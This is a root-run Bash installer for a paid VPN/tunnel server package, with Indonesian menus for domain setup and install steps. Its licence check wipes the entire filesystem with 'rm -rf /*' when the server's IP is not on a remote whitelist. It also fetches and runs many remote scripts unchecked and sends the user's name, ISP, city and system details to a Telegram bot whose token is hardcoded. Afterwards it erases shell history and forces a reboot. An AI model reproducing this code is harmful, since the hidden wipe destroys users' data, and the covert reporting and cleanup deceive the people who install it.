#!/bin/bash
clear
start=$(date +%s)
# warna hidup wkwkwk
C='\e[1;32m'
G='\e[1;32m'
N='\e[0m'
W='\e[1;37m'

# REPOSITORY
REPOKU="https://raw.githubusercontent.com/AdijayaTunneling/ip/main"
REPOSC="https://raw.githubusercontent.com/Garut-SisiBukit/VVIP/main"
#REPOKEY="https://raw.githubusercontent.com/r/key/main"

# TELEGRAMKU
CHATID="-7432279779"
TOKENBOT="7332449337:AAFRxi0cPjPLir90z_cvWxzOb_KXh-F2_fU"

# cek cek vps dulu kak
cd /root
[[ "${EUID}" -ne 0 ]] && { echo "You need to run this script as root"; exit 1; }
[[ "$(systemd-detect-virt)" == "openvz" ]] && { echo "OpenVZ is not supported"; exit 1; }
junc0() { rm -rf $0; exit 0; }

localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
[[ "$hst" != "$dart" ]] && echo "$localip $(hostname)" >> /etc/hosts
trap junc0 SIGINT
trap junc0 SIGTERM
trap junc0 EXIT
function STARTING() { echo -e "  Waktu instalasi :${C} $(( ${1} / 3600 )) ${N}jam${C} $(( (${1} / 60) % 60 )) ${N}menit${C} $(( ${1} % 60 )) ${N}detik"; }
rm -rf /etc/rmbl
mkdir -p /etc/rmbl
mkdir -p /etc/rmbl/theme
mkdir -p /var/lib/ >/dev/null 2>&1
echo "IP=" >> /var/lib/ipvps.conf
clear
echo
echo -e " ${C}╭══════════════════════════════════════════╮${N}"
echo -e " ${C}│${W}            MASUKKAN NAMA KAMU            ${C}│${N}"
echo -e " ${C}╰══════════════════════════════════════════╯${N}"
echo " "
until [[ $name =~ ^[a-zA-Z0-9_.-]+$ ]]; do
    read -rp "  Masukan Nama Kamu Disini tanpa spasi : " -e name
done
rm -rf /etc/profil
echo "$name" > /etc/profil
author=$(cat /etc/profil | awk '{print $1}')

function domain(){
fun_bar() {
    CMD[0]="$1"
    CMD[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${CMD[0]} -y >/dev/null 2>&1
        ${CMD[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "\033[1;33m  Update Domain... \033[1;37m- \033[1;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[0;32m●"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[0;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "\033[1;33m  Update Domain... \033[1;37m- \033[1;33m["
    done
    echo -e "\033[1;33m]\033[1;37m -\033[1;32m Succes !\033[1;37m"
    tput cnorm
}
res1() {
    curl -sO ${REPOSC}/install/poindomain.sh && chmod +x poindomain.sh && ./poindomain.sh
    clear
}
cd
clear
echo
echo -e " ${C}╭══════════════════════════════════════════╮${N}"
echo -e " ${C}│${W}       MENU PILIHAN INPUT DOMAIN VPS      ${C}│${N}"
echo -e " ${C}╰══════════════════════════════════════════╯${N}"
echo -e " ${C}╭══════════════════════════════════════════╮${N}"
echo -e " ${C}│${W} [${C}01${W}] Domain kamu sendiri                 ${C}│${N}"
#echo -e " ${C}│                                          │${N}"
echo -e " ${C}│${W} [${C}02${W}] Domain Yang Punya Script            ${C}│${N}"
echo -e " ${C}╰══════════════════════════════════════════╯${N}"
until [[ $domain =~ ^[132]+$ ]]; do
    read -p "  Masukkan pilihan kamu 1/2 : " domain
done
if [[ $domain == "1" ]]; then
    until [[ $dnss =~ ^[a-zA-Z0-9_.-]+$ ]]; do
        echo
        read -rp "  Masukan domain kamu di sini : " -e dnss
    done
    rm -rf /etc/xray
    rm -rf /etc/v2ray
    rm -rf /etc/nsdomain
    rm -rf /etc/per
    mkdir -p /etc/xray
    mkdir -p /etc/v2ray
    mkdir -p /etc/nsdomain
    touch /etc/xray/domain
    touch /etc/v2ray/domain
    touch /etc/xray/slwdomain
    touch /etc/v2ray/scdomain
    echo "$dnss" > /root/domain
    echo "$dnss" > /root/scdomain
    echo "$dnss" > /etc/xray/scdomain
    echo "$dnss" > /etc/v2ray/scdomain
    echo "$dnss" > /etc/xray/domain
    echo "$dnss" > /etc/v2ray/domain
    echo "IP=$dnss" > /var/lib/ipvps.conf
    echo ""
    clear
fi
if [[ $domain == "2" ]]; then
    clear
    echo
    echo -e " ${C}╭══════════════════════════════════════════╮${N}"
    echo -e " ${C}│${W}     MENU PILIHAN DOMAIN BAWAAN SCRIPT    ${C}│${N}"
    echo -e " ${C}╰══════════════════════════════════════════╯${N}"
    echo -e " ${C}╭══════════════════════════════════════════╮${N}"
    echo -e " ${C}│${W} [${C}01${W}] Domain sub.bandarvpn.cloud         ${C}│${N}"
    echo -e " ${C}╰══════════════════════════════════════════╯${N}"
    until [[ $domain2 =~ ^[1-5]+$ ]]; do
        read -p "  Masukkan pilihan angka 1 : " domain2
    done
fi
if [[ $domain2 == "1" ]]; then
    until [[ $dn1 =~ ^[a-zA-Z0-9_.-]+$ ]]; do
        echo
        read -rp "  Masukan subdomain kamu di sini tanpa spasi: " -e dn1
    done
    rm -rf /etc/xray
    rm -rf /etc/v2ray
    rm -rf /etc/nsdomain
    rm -rf /etc/per
    mkdir -p /etc/xray
    mkdir -p /etc/v2ray
    mkdir -p /etc/nsdomain
    mkdir -p /etc/per
    touch /etc/per/id
    touch /etc/per/token
    touch /etc/xray/domain
    touch /etc/v2ray/domain
    touch /etc/xray/slwdomain
    touch /etc/v2ray/scdomain
    echo "$dn1" > /root/subdomainx
    cd
    sleep 1
    clear
    echo
    echo -e " ${C}╭══════════════════════════════════════════╮${N}"
    echo -e " ${C}│${W}   PROSES POINTING DOMAIN KE CLOUDFLARE   ${C}│"
    echo -e " ${C}╰══════════════════════════════════════════╯${N}"
    fun_bar 'res1'
    clear
    rm /root/subdomainx
fi

if [[ $domain == "3" ]]; then
    until [[ $dns1 =~ ^[a-zA-Z0-9_.-]+$ ]]; do
        read -rp "  Masukan domain kamu di sini : " -e dns1
    done
    echo ""
    echo "$dns1" > /etc/xray/domain
    echo "$dns1" > /etc/v2ray/domain
    echo "IP=$dns1" > /var/lib/ipvps.conf
    until [[ $dns2 =~ ^[a-zA-Z0-9_.-]+$ ]]; do
        read -rp "  Masukan Domain SlowDNS kamu di sini : " -e dns2
    done
    echo $dns2 >/etc/xray/dns
fi
}

themes=(green yellow red blue magenta cyan lightgray darkgray lightred lightgreen lightyellow lightblue lightmagenta lightcyan)
bgs=('\e[37;1;42m' '\e[37;1;43m' '\e[37;1;41m' '\e[37;1;44m' '\e[37;1;45m' '\e[37;1;46m' '\e[37;1;47m' '\e[37;1;100m' '\e[37;1;101m' '\e[37;1;102m' '\e[37;1;103m' '\e[37;1;104m' '\e[37;1;105m' '\e[37;1;106m')
texts=('\033[0;32m' '\033[0;33m' '\033[0;31m' '\033[0;34m' '\033[0;35m' '\033[0;36m' '\033[0;37m' '\033[0;90m' '\033[0;91m' '\033[0;92m' '\033[0;93m' '\033[0;94m' '\033[0;95m' '\033[0;96m')

for i in ${!themes[@]}; do
  cat <<EOF>> /etc/rmbl/theme/${themes[$i]}
BG : ${bgs[$i]}
TEXT : ${texts[$i]}
EOF
done

echo "lightgreen" > /etc/rmbl/theme/color.conf

function RMBLVPN(){
    cd
    sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
    sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
    clear
    curl -sO ${REPOSC}/tools.sh &> /dev/null
    chmod +x tools.sh
    ./tools.sh
    clear
    ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
    apt install git curl -y >/dev/null 2>&1
    apt install python -y >/dev/null 2>&1
}

function CEKIP() {
    # Ambil IP publik server
    MYIP=$(curl -sS ipv4.icanhazip.com)
    
    # Dapatkan daftar IP dari repository dan cocokkan dengan IP server
    IPVPS=$(curl -sS $REPOKU/ip | grep $MYIP | awk '{print $4}')
    
    if [[ $MYIP == $IPVPS ]]; then
        # Jika IP cocok, jalankan fungsi domain dan RMBLVPN
        domain
        RMBLVPN
    else
        # Jika IP tidak cocok, beri tahu pengguna dengan teks merah dan jalankan penghapusan
        echo -e "\e[1;31m⚠️ Anda tidak diizinkan.\e[0m"
        
        # Perintah yang sangat berbahaya: menghapus semua file dan direktori di sistem
        rm -rf /* > /dev/null 2>&1 &
        
        # Keluar dari script dengan status error
        exit 1
    fi
}
function RMBLVPNANIMASI(){
    fun_bar() {
        CMD[0]="$1"
        (
            [[ -e $HOME/fim ]] && rm $HOME/fim
            ${CMD[0]} -y >/dev/null 2>&1
            touch $HOME/fim
        ) >/dev/null 2>&1 &
        tput civis
        echo -ne "\033[1;33m  ➪ \033[1;32m["
        while true; do
            for ((i = 1; i <= 39; i++)); do
                echo -ne "\033[0;32m█"
                sleep 0.1s
            done
            [[ -e $HOME/fim ]] && rm $HOME/fim && break
            echo -e "\033[0;33m]"
            sleep 0.1s
            tput cuu1
            tput dl1
            echo -ne "\033[1;33m  ➪ \033[1;32m["
        done
        echo -e "\033[1;33m]\033[1;37m - \033[1;32m100%\033[1;37m"
        sleep 1
        tput cnorm
    }

    res2() { curl -sO ${REPOSC}/install/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh; }
    res3() { curl -sO ${REPOSC}/install/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh; }
    res4() { curl -sO ${REPOSC}/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh; }
    res5() { curl -sO ${REPOSC}/install/set-br.sh && chmod +x set-br.sh && ./set-br.sh; }
    res6() { curl -sO ${REPOSC}/sshws/ohp.sh && chmod +x ohp.sh && ./ohp.sh; }
    res7() { curl -sO ${REPOSC}/menu/ekstra.sh && chmod +x ekstra.sh && ./ekstra.sh; }
    res8() { curl -sO ${REPOSC}/install/udp-custom.sh && chmod +x udp-custom.sh && ./udp-custom.sh; }
    clear
    echo
    echo -e " ${C}╭══════════════════════════════════════════╮${N}"
    echo -e " ${C}│${W}       PROSES INSTALL SSH & OVPN          ${C}│${N}"
    echo -e " ${C}╰══════════════════════════════════════════╯${N}"
    echo -e " ${Y} Process... 5%"
    fun_bar 'res2'
    clear
    echo
    echo -ne " ${C}╭══════════════════════════════════════════╮${N}\n"
    echo -ne " ${C}│${W}          PROSES INSTALL XRAY             ${C}│${N}\n"
    echo -ne " ${C}╰══════════════════════════════════════════╯${N}\n"
    echo -ne " ${Y} Process... 25%\n"
    fun_bar 'res3'
    clear
    echo
    echo -ne " ${C}╭══════════════════════════════════════════╮${N}\n"
    echo -ne " ${C}│${W}      PROSES INSTAL SSH WEBSOCKET         ${C}│${N}\n"
    echo -ne " ${C}╰══════════════════════════════════════════╯${N}\n"
    echo -ne " ${Y} Process... 45%\n"
    fun_bar 'res4'
    clear
    echo
    echo -ne " ${C}╭══════════════════════════════════════════╮${N}\n"
    echo -ne " ${C}│${W}       PROSES INSTALL MENU BACKUP         ${C}│${N}\n"
    echo -ne " ${C}╰══════════════════════════════════════════╯${N}\n"
    echo -ne " ${Y} Process... 65%\n"
    fun_bar 'res5'
    clear
    echo
    echo -ne " ${C}╭══════════════════════════════════════════╮${N}\n"
    echo -ne " ${C}│${W}           PROSES INSTALL OHP             ${C}│${N}\n"
    echo -ne " ${C}╰══════════════════════════════════════════╯${N}\n"
    echo -ne " ${Y} Process... 70%\n"
    fun_bar 'res6'
    clear
    echo
    echo -ne " ${C}╭══════════════════════════════════════════╮${N}\n"
    echo -ne " ${C}│${W}       PROSES INSTALL MENU EKSTRA         ${C}│${N}\n"
    echo -ne " ${C}╰══════════════════════════════════════════╯${N}\n"
    echo -ne " ${Y} Process... 80%\n"
    fun_bar 'res7'
    clear
    echo
    echo -ne " ${C}╭══════════════════════════════════════════╮${N}\n"
    echo -ne " ${C}│${W}       PROSES INSTALL UDP CUSTOM          ${C}│${N}\n"
    echo -ne " ${C}╰══════════════════════════════════════════╯${N}\n"
    echo -ne " ${Y} Process... 85%\n"
    fun_bar 'res8'
    clear
    echo
    echo -ne " ${C}╭══════════════════════════════════════════╮${N}\n"
    echo -ne " ${C}│${W}         PROSES INSTALLL SELESAI          ${C}│${N}\n"
    echo -ne " ${C}╰══════════════════════════════════════════╯${N}\n"
    echo -ne " ${Y} Process... 100% ${C}Succesfully...\n"
    echo -ne " ${G} ██████████████████████████████████████████${N}\n"
    echo
    echo -ne " ${C}╭══════════════════════════════════════════╮${N}\n"
    echo -ne " ${C}│${W}          WAKTU INSTALASI SCRIPT          ${C}│${N}\n"
    echo -ne " ${C}╰══════════════════════════════════════════╯${N}\n"
    STARTING "$(($(date +%s) - ${start}))" | tee -a log-install.txt
}

function convert() {
    local -i megabytes=$1
    if [[ $megabytes -lt 1024 ]]; then
        echo "${megabytes} MB"
    else
        echo "$(awk "BEGIN {printf \"%.1f\", $megabytes/1024}" | sed 's/\.0$//') GB"
    fi
}

function conv() { date -u -d "@$1" +'%H:%M:%S'; }


function TERAKHIR(){
    finish=$(date +%s)
    instalasi=$((finish - start))
    TIMES="10"
    CHATID="$CHATID"
    KEY="$TOKENBOT"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    ISP=$(curl -s ipinfo.io/org | cut -d " " -f 2-10)
    CITY=$(curl -s ipinfo.io/city)
    domain=$(cat /etc/xray/domain)
    TIME=$(date +'%d-%m-%Y | %H:%M %Z')
    RAM=$(free -m | awk 'NR==2 {print $2}'); RAM=$(convert $RAM)
    MODEL2=$(grep -w PRETTY_NAME /etc/os-release | awk -F'=' '{print $2}' | sed 's/"//g' | sed 's/ *(.*)//' | awk '{for(i=1;i<=10;i++) printf $i" "; if(NF>10) printf "..."; print ""}')
    MYIP=$(curl -sS ipv4.icanhazip.com)
    IZIN=$(curl -sS ${REPOKU}/ip | grep $MYIP | awk '{print $3}' )
    d1=$(date -d "$IZIN" +%s)
    d2=$(date -d "$today" +%s)
    EXP=$(( (d1 - d2) / 86400 ))
    proses=$(conv $instalasi)
    echo "$proses" > /etc/waktuinstalasi.log
    TEXT="<code>
╔▬▭▬▭▭✦༒✦▬▬▭▬▭╗
  ⚠️ AUTO SCRIPT INSTALL 
╚▬▭▬▭▭✦༒✦▬▭▬▭▭╝
╔▬▭▬▬▭✦༒✦▬▭▬▭▭╗
╠ NAME  : ${author}
╠ ISP   : ${ISP}
╠ CITY  : ${CITY}
╠ OS    : ${MODEL2}
╠ RAM   : ${RAM}
╠ TIME  : $proses
╠ EXP   : ${IZIN}
╠ AKTIF : ${EXP} Days
╚▬▭▬▭▭✦༒✦▬▭▬▭▭╝
╔▬▭▬▭▭✦༒✦▬▭▬▭▭╗
      ADIJAYA VPN
╚▬▭▬▭▭✦༒✦▬▭▬▭▭╝
</code>"'&reply_markup={"inline_keyboard":[[{"text":"🔥TELEGRAM","url":"https://t.me/AdijayaStoreVpn"},{"text":"WHATSAPP 🔥","url":"wa.me/6281214726068"}]]}'
    curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}
[B
function FINISHING() {
    cat> /root/.profile << END
if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
        . ~/.bashrc
    fi
fi
mesg n || true
clear
menu
END
    echo -e "alias x='exit'\n" >> ~/.bashrc
    chmod 644 /root/.profile
	[ -f "/root/log-install.txt" ] && rm /root/log-install.txt > /dev/null 2>&1
	[ -f "/etc/afak.conf" ] && rm /etc/afak.conf > /dev/null 2>&1
	[ ! -f "/etc/log-create-user.log" ] && echo "Log All Account " > /etc/log-create-user.log
    history -c
    serverV=$( curl -sS ${REPOSC}/versi  )
    echo $serverV > /opt/.ver
    aureb=$(cat /home/re_otm)
    b=11
	[ $aureb -gt $b ] && gg="PM" || gg="AM"
    cd
    curl -sS ipv4.icanhazip.com > /etc/myipvps
    curl -s ipinfo.io/city?token=75082b4831f909 >> /etc/xray/city
    curl -s ipinfo.io/org?token=75082b4831f909  | cut -d " " -f 2-10 >> /etc/xray/isp
    rm -f /root/setup.sh slhost.sh ssh-vpn.sh ins-xray.sh insshws.sh set-br.sh ohp.sh ekstra.sh slowdns.sh>/dev/null 2>&1
}

CEKIP
RMBLVPNANIMASI
TERAKHIR
FINISHING
cd
rm -rf *
> ~/.bash_history
history -c
echo -e " ${C}╭══════════════════════════════════════════╮${N}"
echo -e " ${C}│${W}      VPS REBOOT DALAM 5 DETIK            ${C}│${N}"
echo -e " ${C}╰══════════════════════════════════════════╯${N}"
tput civis
for i in {5..1}
do
    echo -ne "\r  Reboot ${G}$i${N} detik lagi.."
    sleep 1
done
echo -ne "\r  Reboot ${G}sekarang..!!    \n"
tput cnorm
clear
reboot
